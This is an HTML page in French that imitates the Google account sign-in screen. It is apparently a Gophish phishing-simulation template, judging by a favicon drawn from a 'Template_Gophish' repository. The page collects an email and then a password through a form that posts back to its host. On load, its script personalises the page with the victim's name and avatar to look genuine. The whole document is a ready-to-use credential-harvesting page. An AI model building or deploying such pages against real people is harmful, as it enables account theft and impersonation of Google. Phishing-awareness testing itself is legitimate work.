<!DOCTYPE html><html lang="fr"><head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Connexion - Comptes Google</title>
    <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/logo_google-1.png?raw=true"/>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet"/>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
    <link rel="stylesheet" href="/style/google.css"/>
</head>
<body>
    <div class="login-container">
        <div class="login-left">
            <div class="login-header">
                 <link rel="shortcut icon" href="https://github.com/PassAndSecure/Template_Gophish/blob/main/Picture-Template/logo_google-1.png?raw=true"/>
            </div>
            <h2 id="userName">Connexion</h2>
            <button id="emailButton" onclick="showEmailSection()"></button>
            <p id="googleAccountText">Utilisez votre compte Google</p>
        </div>
        <div class="login-right">
            <form id="loginForm" method="post" action="">
                <div id="emailSection">
                    <div class="form-group" style="margin-bottom: -3px;">
                        <input type="email" class="form-control" id="email" placeholder="Adresse e-mail" value="Email" required=""/>
                    </div>
                    <a href="https://accounts.google.com/signin/v2/usernamerecovery?" class="btn-link">Adresse e-mail oubliée?</a>
                    <div class="info-text">
                        S&#39;il ne s&#39;agit pas de votre ordinateur, utilisez une fenêtre de navigation privée pour vous connecter. <a href="https://support.google.com/accounts?p=signin_privatebrowsing&amp;hl=fr" class="info-link" target="_blank" rel="noopener">En savoir plus sur l&#39;utilisation du mode Invité</a>
                    </div>
                    <div class="footer-links">
                        <a href="#" class="info-link-2" style="margin-bottom: -110px;">Créer un compte</a>
                        <button type="button" class="btn btn-primary" style="margin-bottom: -110px;" onclick="showPasswordSection()">Suivant</button>
                    </div>
                </div>
                <div id="passwordSection" style="display: none;">
                    <div class="form-group-3" style="margin-bottom: -3px;">
                        <input type="password" class="form-control" id="password" placeholder="Saisissez votre mot de passe" required="" name="password"/>
                    </div>
                    <div class="form-group-2" style="margin-left: 23px;">
                        <input type="checkbox" id="showPasswordCheckbox" class="custom-checkbox" onclick="togglePasswordVisibility()"/>
                        <label for="showPasswordCheckbox">Afficher le mot de passe</label>
                    </div>
                    <div class="footer-links">
                        <a href="https://www.google.com/url?sa=t&amp;source=web&amp;rct=j&amp;opi=89978449&amp;url=https://takeout.google.com" class="info-link-2" style="margin-bottom: -220px; margin-left: 240px;">Mot de passe oublié ?</a>
                        <button type="submit" class="btn btn-primary" style="margin-bottom: -220px;">Suivant</button>
                    </div>
                </div>
            </form>
        </div>
    </div>
    <div class="bottom-links custom-text">
        <div>
        <a href="#" class="bottom-link custom-text" style="margin-right:650px;">Français (France)
        <span class="arrow-2"><i class="fa-solid fa-caret-down"></i></span>
        </a>
        
            <a href="https://support.google.com/accounts?hl=fr&amp;p=account_iph" class="bottom-link-2 custom-text" style="margin-right: 30px;" target="_blank" rel="noopener">Aide</a>
            <a href="https://accounts.google.com/TOS?loc=FR&amp;hl=fr&amp;privacy=true" class="bottom-link-2 custom-text" style="margin-right: 30px;" target="_blank" rel="noopener">Confidentialité</a>
            <a href="https://accounts.google.com/TOS?loc=FR&amp;hl=fr" class="bottom-link-2 custom-text" target="_blank" rel="noopener">Conditions</a>
        </div>
    </div>

    <script>
        function showPasswordSection() {
            const email = document.getElementById('email').value;
            const emailParts = email.split('@')[0].split('.');
            const firstName = emailParts[0].charAt(0).toUpperCase() + emailParts[0].slice(1);
            const lastName = emailParts[1].toUpperCase();
            const userName = firstName + ' ' + lastName;

            const initial = email.charAt(0).toUpperCase();
            const randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);

            document.getElementById('userName').textContent = userName;

            const emailButton = document.getElementById('emailButton');
            emailButton.innerHTML = `
                <div style="display: flex; align-items: center;">
                    <div class="avatar" style="background-color: ${randomColor};">${initial}</div>
                    <span>${email}</span>
                </div>
                <i class="fa-solid fa-caret-down arrow"></i>
            `;
            emailButton.style.display = 'flex';

            document.getElementById('googleAccountText').style.display = 'none';
            document.getElementById('emailSection').style.display = 'none';
            document.getElementById('passwordSection').style.display = 'block';
        }

        function showEmailSection() {
            document.getElementById('userName').textContent = 'Connexion';
            document.getElementById('emailButton').style.display = 'none';
            document.getElementById('googleAccountText').style.display = 'block';
            document.getElementById('passwordSection').style.display = 'none';
            document.getElementById('emailSection').style.display = 'block';
        }

        function togglePasswordVisibility() {
            const passwordField = document.getElementById('password');
            if (document.getElementById('showPasswordCheckbox').checked) {
                passwordField.type = 'text';
            } else {
                passwordField.type = 'password';
            }
        }

        // Trigger the showPasswordSection function on page load to display the email avatar
        document.addEventListener('DOMContentLoaded', (event) => {
            showPasswordSection();
        });
    </script>


  </body>
</html>